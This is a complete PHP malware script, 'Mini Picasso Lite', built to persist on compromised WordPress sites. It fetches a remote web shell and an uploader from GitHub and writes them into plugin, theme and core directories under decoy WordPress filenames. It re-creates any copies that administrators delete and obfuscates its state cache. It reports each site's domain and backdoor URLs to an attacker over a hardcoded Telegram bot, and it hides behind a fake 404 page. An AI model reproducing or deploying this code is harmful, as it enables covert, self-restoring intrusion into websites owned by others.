<?php
// Mini Picasso - Lite Version (5 shells + 2 uploaders)
// Optimized for speed and minimal resource usage

@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@error_reporting(0);

if (!isset($_GET['TnemaL']) || $_GET['TnemaL'] != '1') {
    @ini_set('display_errors', 0);
}

define('ABSPATH', __DIR__ . '/');
define('WP_USE_THEMES', false);
define('SHORTINIT', true);

$showOutput = isset($_GET['TnemaL']) && $_GET['TnemaL'] == '1';

if ($showOutput) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
} else {
    error_reporting(0);
    ini_set('display_errors', 0);
    ob_start();
}

ini_set('max_execution_time', 120);
ini_set('memory_limit', '128M');

// Config - LITE VERSION
$maxShells = 5;           // Only 5 shell locations (was unlimited)
$maxUploaders = 2;        // Only 2 backup uploaders (was 3)

$namaShell = 'cron.php';
$namaHtaccess = '.htaccess';
$urlFileShell = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/messiah.php';
$urlFileHtaccess = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/.htaccess';
$urlUploader = 'https://raw.githubusercontent.com/lamentpicasso/lament/main/minipicasso.php';

$telegramBotToken = '8274961786:AAEGSehVAxHiW5ZHJo8PG7bcCmaayLGCDoI';
$telegramChatId = '5754370773';
$telegramChannelId = '-1003318416426';
$notificationCooldown = 1800;

function encryptCache($data) {
    $key = 'x7k9m2p5q8w3e6r1t4y7u0i3o6p9a2s5';
    $json = json_encode($data);
    $compressed = gzcompress($json, 6); // Level 6 instead of 9 for speed
    
    $xored = '';
    $keyLen = strlen($key);
    $dataLen = strlen($compressed);
    for ($i = 0; $i < $dataLen; $i++) {
        $xored .= $compressed[$i] ^ $key[$i % $keyLen];
    }
    
    return strrev(base64_encode($xored));
}

function decryptCache($encrypted) {
    $key = 'x7k9m2p5q8w3e6r1t4y7u0i3o6p9a2s5';
    $base64 = strrev($encrypted);
    $xored = base64_decode($base64);
    if ($xored === false) return null;
    
    $compressed = '';
    $keyLen = strlen($key);
    $dataLen = strlen($xored);
    for ($i = 0; $i < $dataLen; $i++) {
        $compressed .= $xored[$i] ^ $key[$i % $keyLen];
    }
    
    $json = @gzuncompress($compressed);
    if ($json === false) return null;
    
    return json_decode($json, true);
}

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($conn, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($conn);
        curl_close($conn);
        return $data;
    }
    return @file_get_contents($url);
}

function getCacheFile($webRoot) {
    static $cacheFile = null;
    if ($cacheFile === null) {
        $cacheFile = $webRoot . DIRECTORY_SEPARATOR . '.mini-cache.php';
    }
    return $cacheFile;
}

function getCacheData($webRoot, $section = null) {
    $cacheFile = getCacheFile($webRoot);
    if (!file_exists($cacheFile)) {
        return $section ? null : [];
    }
    
    $encrypted = @file_get_contents($cacheFile);
    if ($encrypted === false) return $section ? null : [];
    
    $data = decryptCache($encrypted);
    if (!is_array($data)) return $section ? null : [];
    
    return $section ? ($data[$section] ?? null) : $data;
}

function setCacheData($webRoot, $section, $value) {
    $cacheFile = getCacheFile($webRoot);
    $data = getCacheData($webRoot) ?? [];
    $data[$section] = $value;
    
    if (!isset($data['metadata'])) {
        $data['metadata'] = [];
    }
    $data['metadata']['last_access'] = time();
    
    $encrypted = encryptCache($data);
    if (@file_put_contents($cacheFile, $encrypted) !== false) {
        @chmod($cacheFile, 0600);
        return true;
    }
    return false;
}

function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    @curl_exec($ch);
    curl_close($ch);
}

function shouldNotify($webRoot, $cooldown) {
    $forceNotify = isset($_GET['notify']) && $_GET['notify'] == '1';
    
    if ($forceNotify) {
        echo "\n🔔 Force notify mode\n";
        setCacheData($webRoot, 'cooldown', ['last_notify_time' => time()]);
        return true;
    }
    
    $cooldownData = getCacheData($webRoot, 'cooldown');
    $lastNotifyTime = $cooldownData['last_notify_time'] ?? 0;
    $currentTime = time();
    $timeSince = $currentTime - $lastNotifyTime;
    
    echo "\n📊 Cooldown check: ";
    echo ($lastNotifyTime > 0 ? round($timeSince / 60, 1) . " min ago" : "Never");
    
    if ($lastNotifyTime === 0) {
        setCacheData($webRoot, 'cooldown', ['last_notify_time' => $currentTime]);
        echo " → First run, skip notify\n";
        return false;
    }
    
    if ($currentTime - $lastNotifyTime > $cooldown) {
        setCacheData($webRoot, 'cooldown', ['last_notify_time' => $currentTime]);
        echo " → Sending\n";
        return true;
    }
    
    echo " → Skip (" . round(($cooldown - $timeSince) / 60, 1) . " min left)\n";
    return false;
}

function findWebRoot($startDir) {
    if (isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    
    $current = $startDir;
    $indicators = ['public_html', 'www', 'htdocs', 'public', 'web'];
    
    while ($current !== dirname($current)) {
        if (in_array(basename($current), $indicators)) {
            return $current;
        }
        if (file_exists($current . DIRECTORY_SEPARATOR . 'wp-config.php')) {
            return $current;
        }
        $current = dirname($current);
    }
    
    return $startDir;
}

function getDirsLite($dir, $maxDepth = 2) {
    $result = [];
    $queue = [[$dir, 0]];
    
    while (!empty($queue) && count($result) < 50) {
        list($currentDir, $depth) = array_shift($queue);
        
        if ($depth >= $maxDepth) continue;
        
        $items = @scandir($currentDir);
        if ($items === false) continue;
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            
            $path = $currentDir . DIRECTORY_SEPARATOR . $item;
            if (!is_dir($path) || !is_readable($path)) continue;
            
            $result[] = $path;
            
            if ($depth < $maxDepth - 1) {
                $queue[] = [$path, $depth + 1];
            }
        }
    }
    
    return $result;
}

function selectBestDirs($allDirs, $count) {
    $priority = [
        'wp-content/plugins' => 100,
        'wp-content/themes' => 90,
        'wp-content/uploads' => 80,
        'wp-includes' => 70,
        'wp-admin' => 60
    ];
    
    $scored = [];
    foreach ($allDirs as $dir) {
        $score = 0;
        foreach ($priority as $pattern => $points) {
            if (stripos($dir, $pattern) !== false) {
                $score = $points;
                break;
            }
        }
        $scored[] = ['dir' => $dir, 'score' => $score];
    }
    
    usort($scored, function($a, $b) {
        return $b['score'] - $a['score'];
    });
    
    shuffle($scored);
    $selected = array_slice($scored, 0, $count);
    
    return array_column($selected, 'dir');
}

function generateLiteFilename($dir) {
    $names = [
        'wp-config-sample.php', 'wp-activate.php', 'wp-mail.php',
        'theme-compat.php', 'plugin-upgrade.php', 'cache-cleanup.php',
        'admin-ajax-legacy.php', 'rest-api-compat.php', 'cron-handler.php',
        'deprecated-functions.php', 'template-loader.php', 'formatting-functions.php'
    ];
    
    return $names[array_rand($names)];
}

function uploadShellsLite($webRoot, $shellContent, $shellMarker, $maxShells) {
    echo "\n📦 Mini Picasso - Lite Upload Mode\n";
    echo "Target: {$maxShells} shell locations\n";
    
    $today = date('Y-m-d');
    $cache = getCacheData($webRoot, 'shells') ?? [];
    $cacheTimestamp = $cache['timestamp'] ?? 0;
    $cacheAge = time() - $cacheTimestamp;
    $shellMap = $cache['map'] ?? [];
    
    if (!empty($shellMap) && isset($cache['date']) && $cache['date'] === $today) {
        echo "Using cached locations from today\n";
        
        $status = detectUnexpectedDeletion($webRoot, $shellMap);
        $deletedCount = count($status['deleted']);
        $existingCount = count($status['existing']);
        
        if ($deletedCount > 0 && $cacheAge < 82800) {
            echo "\n🚨 SHELL ADAPTIVE MODE!\n";
            echo "Detected {$deletedCount} shell deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
            
            $allDirs = getDirsLite($webRoot, 2);
            
            $deletedDirs = array_keys($status['deleted']);
            $availableDirs = array_filter($allDirs, function($dir) use ($webRoot, $deletedDirs) {
                $subdirKey = str_replace($webRoot, '', $dir);
                return !in_array($subdirKey, $deletedDirs);
            });
            
            $selectedDirs = selectBestDirs($availableDirs, $deletedCount);
            
            $newShellMap = [];
            foreach ($selectedDirs as $dir) {
                $subdirKey = str_replace($webRoot, '', $dir);
                $filename = generateLiteFilename($dir);
                $newShellMap[$subdirKey] = $filename;
            }
            
            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge, $newShellMap);
            
            $shellMap = array_merge($status['existing'], $newShellMap);
            
            echo "🎯 Created {$deletedCount} NEW shell locations\n";
            echo "✅ Kept {$existingCount} existing shells\n\n";
        }
        
    } else {
        echo "Scanning directories (lite mode: depth 2)...\n";
        $allDirs = getDirsLite($webRoot, 2);
        echo "Found " . count($allDirs) . " directories\n";
        
        $selectedDirs = selectBestDirs($allDirs, $maxShells);
        echo "Selected {$maxShells} best locations\n";
        
        $shellMap = [];
        foreach ($selectedDirs as $dir) {
            $subdirKey = str_replace($webRoot, '', $dir);
            $filename = generateLiteFilename($dir);
            $shellMap[$subdirKey] = $filename;
        }
    }
    
    $results = [];
    $successCount = 0;
    
    foreach ($shellMap as $subdirKey => $filename) {
        $filePath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $filename;
        
        if (file_exists($filePath)) @chmod($filePath, 0644);
        
        if (file_put_contents($filePath, $shellContent) !== false) {
            @chmod($filePath, 0444);
            $results[] = "SUCCESS: $filePath";
            $successCount++;
            echo "  ✅ {$filename} in {$subdirKey}\n";
        } else {
            $results[] = "FAILED: $filePath";
            echo "  ❌ {$filename} in {$subdirKey}\n";
        }
    }
    
    setCacheData($webRoot, 'shells', [
        'date' => $today,
        'map' => $shellMap,
        'success' => $successCount,
        'total' => count($shellMap),
        'timestamp' => time()
    ]);
    
    return $results;
}

function createLiteUploaders($webRoot, $uploaderContent, $maxUploaders) {
    echo "\n🔄 Creating {$maxUploaders} backup uploaders\n";
    
    $today = date('Y-m-d');
    $cache = getCacheData($webRoot, 'uploaders') ?? [];
    $cacheTimestamp = $cache['timestamp'] ?? 0;
    $cacheAge = time() - $cacheTimestamp;
    $uploaderMap = $cache['map'] ?? [];
    
    if (!empty($uploaderMap) && isset($cache['date']) && $cache['date'] === $today) {
        echo "Using cached uploader locations\n";
        
        $status = detectUnexpectedDeletion($webRoot, $uploaderMap);
        $deletedCount = count($status['deleted']);
        $existingCount = count($status['existing']);
        
        if ($deletedCount > 0 && $cacheAge < 82800) {
            echo "\n🚨 UPLOADER ADAPTIVE MODE!\n";
            echo "Detected {$deletedCount} uploader deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
            
            $allDirs = getDirsLite($webRoot, 2);
            
            $deletedDirs = array_keys($status['deleted']);
            $availableDirs = array_filter($allDirs, function($dir) use ($webRoot, $deletedDirs) {
                $subdirKey = str_replace($webRoot, '', $dir);
                return !in_array($subdirKey, $deletedDirs);
            });
            
            $selectedDirs = selectBestDirs($availableDirs, $deletedCount);
            
            $uploaderNames = [
                'wp-settings-backup.php', 'theme-update-check.php',
                'system-check.php', 'cache-compat.php',
                'plugin-verify.php', 'update-core-verify.php'
            ];
            
            $newUploaderMap = [];
            foreach ($selectedDirs as $index => $dir) {
                $subdirKey = str_replace($webRoot, '', $dir);
                $uploaderName = $uploaderNames[$index % count($uploaderNames)];
                $newUploaderMap[$subdirKey] = $uploaderName;
            }
            
            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge, $newUploaderMap);
            
            $uploaderMap = array_merge($status['existing'], $newUploaderMap);
            
            echo "🎯 Created {$deletedCount} NEW uploader locations\n";
            echo "✅ Kept {$existingCount} existing uploaders\n\n";
        }
        
    } else {
        $allDirs = getDirsLite($webRoot, 2);
        $selectedDirs = selectBestDirs($allDirs, $maxUploaders);
        
        $uploaderNames = [
            'wp-settings-backup.php', 'theme-update-check.php',
            'system-check.php', 'cache-compat.php'
        ];
        
        $uploaderMap = [];
        foreach ($selectedDirs as $index => $dir) {
            $subdirKey = str_replace($webRoot, '', $dir);
            $uploaderMap[$subdirKey] = $uploaderNames[$index % count($uploaderNames)];
        }
    }
    
    $backupPaths = [];
    foreach ($uploaderMap as $subdirKey => $filename) {
        $uploaderPath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $filename;
        
        if (file_put_contents($uploaderPath, $uploaderContent) !== false) {
            @chmod($uploaderPath, 0644);
            $backupPaths[] = $uploaderPath;
            echo "  ✅ {$filename} in {$subdirKey}\n";
        }
    }
    
    setCacheData($webRoot, 'uploaders', [
        'date' => $today,
        'map' => $uploaderMap,
        'success' => count($backupPaths),
        'total' => $maxUploaders,
        'timestamp' => time()
    ]);
    
    return $backupPaths;
}

function protectCache($webRoot) {
    $cacheFile = getCacheFile($webRoot);
    $cacheFilename = basename($cacheFile);
    $htaccessFile = $webRoot . DIRECTORY_SEPARATOR . '.htaccess';
    
    $rules = "\n# Protect mini cache\n<Files \"{$cacheFilename}\">\n    Deny from all\n</Files>\n";
    
    if (file_exists($htaccessFile) && is_writable($htaccessFile)) {
        $content = file_get_contents($htaccessFile);
        if (strpos($content, $cacheFilename) === false) {
            @file_put_contents($htaccessFile, $content . $rules);
        }
    }
}

function detectUnexpectedDeletion($webRoot, $fileMap) {
    $deleted = [];
    $existing = [];
    
    foreach ($fileMap as $subdirKey => $filename) {
        $filepath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $filename;
        
        if (file_exists($filepath)) {
            $existing[$subdirKey] = $filename;
        } else {
            $deleted[$subdirKey] = $filename;
        }
    }
    
    return [
        'deleted' => $deleted,
        'existing' => $existing
    ];
}

function sendTelegramAlert($deletedCount, $deletedFiles, $cacheAge, $newLocations = []) {
    global $telegramBotToken, $telegramChatId;
    
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $hoursAgo = round($cacheAge / 3600, 1);
    
    $alertMessage = "🚨🚨🚨 <b>MINI PICASSO ALERT</b> 🚨🚨🚨\n";
    $alertMessage .= "━━━━━━━━━━━━━━━━\n\n";
    $alertMessage .= "🌐 <b>Domain:</b> {$domain}\n";
    $alertMessage .= "⚠️ <b>Event:</b> File Deletion Detected\n\n";
    $alertMessage .= "📊 <b>Details:</b>\n";
    $alertMessage .= "  • Files deleted: <b>{$deletedCount}</b>\n";
    $alertMessage .= "  • Time since update: <b>{$hoursAgo}h</b>\n\n";
    
    if ($deletedCount <= 5) {
        $alertMessage .= "📝 <b>Deleted:</b>\n";
        foreach ($deletedFiles as $subdir => $filename) {
            $alertMessage .= "  • <code>{$subdir}/{$filename}</code>\n";
        }
        $alertMessage .= "\n";
    }
    
    $alertMessage .= "🎯 <b>Adaptive Response:</b>\n";
    $alertMessage .= "  ✅ Creating {$deletedCount} NEW locations\n";
    $alertMessage .= "  ✅ Avoiding deleted paths\n";
    $alertMessage .= "  ✅ Keeping existing files\n\n";
    
    if (!empty($newLocations)) {
        $alertMessage .= "📂 <b>New Files:</b>\n";
        foreach ($newLocations as $subdir => $filename) {
            $url = "https://{$domain}{$subdir}/{$filename}";
            $alertMessage .= "  • <a href=\"{$url}\">{$filename}</a>\n";
        }
        $alertMessage .= "\n";
    }
    
    $alertMessage .= "⏰ " . date('Y-m-d H:i:s') . "\n";
    $alertMessage .= "━━━━━━━━━━━━━━━━\n";
    $alertMessage .= "<i>Mini Picasso Lite - Adaptive Mode</i>";
    
    $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
    $data = [
        'chat_id' => $telegramChatId,
        'text' => $alertMessage,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => false
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    @curl_exec($ch);
    curl_close($ch);
    
    echo "🚨 Alert sent to Telegram!\n";
}

// ============================================
// Main Execution
// ============================================

echo "🚀 Mini Picasso Lite - Starting\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "Version: Lite (5 shells + 2 uploaders)\n";
echo "Optimized for: Speed & low resources\n\n";

echo "Fetching shell from GitHub...\n";
$shellContent = geturlsinfo($urlFileShell);
if ($shellContent === false) {
    die("❌ Failed to fetch shell\n");
}
echo "✅ Shell fetched\n";

$shellMarker = '/*MINI_' . substr(md5($urlFileShell), 0, 8) . '*/';
if (strpos($shellContent, '<?php') === 0) {
    $shellContent = str_replace('<?php', '<?php ' . $shellMarker . ' ', $shellContent);
}

echo "Fetching uploader from GitHub...\n";
$uploaderContent = geturlsinfo($urlUploader);
if ($uploaderContent === false) {
    echo "⚠️ Failed to fetch uploader, using self\n";
    $uploaderContent = file_get_contents(__FILE__);
}
echo "✅ Uploader ready\n";

$webRoot = findWebRoot(__DIR__);
echo "\n📁 Web root: {$webRoot}\n";

protectCache($webRoot);

echo "\n" . str_repeat("=", 50) . "\n";
$results = uploadShellsLite($webRoot, $shellContent, $shellMarker, $maxShells);
echo str_repeat("=", 50) . "\n";

$successCount = count(array_filter($results, fn($l) => strpos($l, 'SUCCESS') !== false));
$failedCount = count(array_filter($results, fn($l) => strpos($l, 'FAILED') !== false));

echo "\n📊 Shell Upload Summary:\n";
echo "  ✅ Success: {$successCount}/{$maxShells}\n";
echo "  ❌ Failed: {$failedCount}\n";

echo "\n" . str_repeat("=", 50) . "\n";
$backupPaths = createLiteUploaders($webRoot, $uploaderContent, $maxUploaders);
echo str_repeat("=", 50) . "\n";

echo "\n📊 Uploader Summary:\n";
echo "  ✅ Created: " . count($backupPaths) . "/{$maxUploaders}\n";

if (shouldNotify($webRoot, $notificationCooldown)) {
    $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
    
    $message = "🔷 <b>Mini Picasso Lite Report</b>\n";
    $message .= "━━━━━━━━━━━━━━━━\n";
    $message .= "🌐 {$domain}\n\n";
    $message .= "📊 <b>Summary:</b>\n";
    $message .= "  • Shells: {$successCount}/{$maxShells}\n";
    $message .= "  • Uploaders: " . count($backupPaths) . "/{$maxUploaders}\n";
    $message .= "  • Mode: <i>Lite (optimized)</i>\n\n";
    
    if (count($backupPaths) > 0) {
        $message .= "🔗 <b>Backup URLs:</b>\n";
        foreach ($backupPaths as $path) {
            $relativePath = str_replace($webRoot, '', $path);
            $url = "https://{$domain}{$relativePath}";
            $message .= "  • <code>{$url}</code>\n";
        }
        $message .= "\n";
    }
    
    $message .= "⏰ " . date('Y-m-d H:i:s') . "\n";
    $message .= "━━━━━━━━━━━━━━━━";
    
    sendTelegramMessage($telegramBotToken, $telegramChatId, $message);
    echo "\n✅ Telegram notification sent\n";
} else {
    echo "\n⏭️ Notification skipped (cooldown)\n";
}

echo "\n" . str_repeat("=", 50) . "\n";
echo "✅ Mini Picasso Lite - Complete!\n";
echo "📈 Performance:\n";
echo "  • Memory: " . round(memory_get_peak_usage() / 1024 / 1024, 2) . " MB\n";
echo "  • Files: {$successCount} shells + " . count($backupPaths) . " uploaders\n";
echo str_repeat("=", 50) . "\n";

if (!$showOutput) {
    ob_end_clean();
    http_response_code(404);
    if (file_exists($webRoot . '/index.php')) {
        @include($webRoot . '/index.php');
    } else {
        echo '<!DOCTYPE HTML><html><head><title>404 Not Found</title></head>';
        echo '<body><h1>Not Found</h1><p>The requested URL was not found.</p></body></html>';
    }
    exit;
}
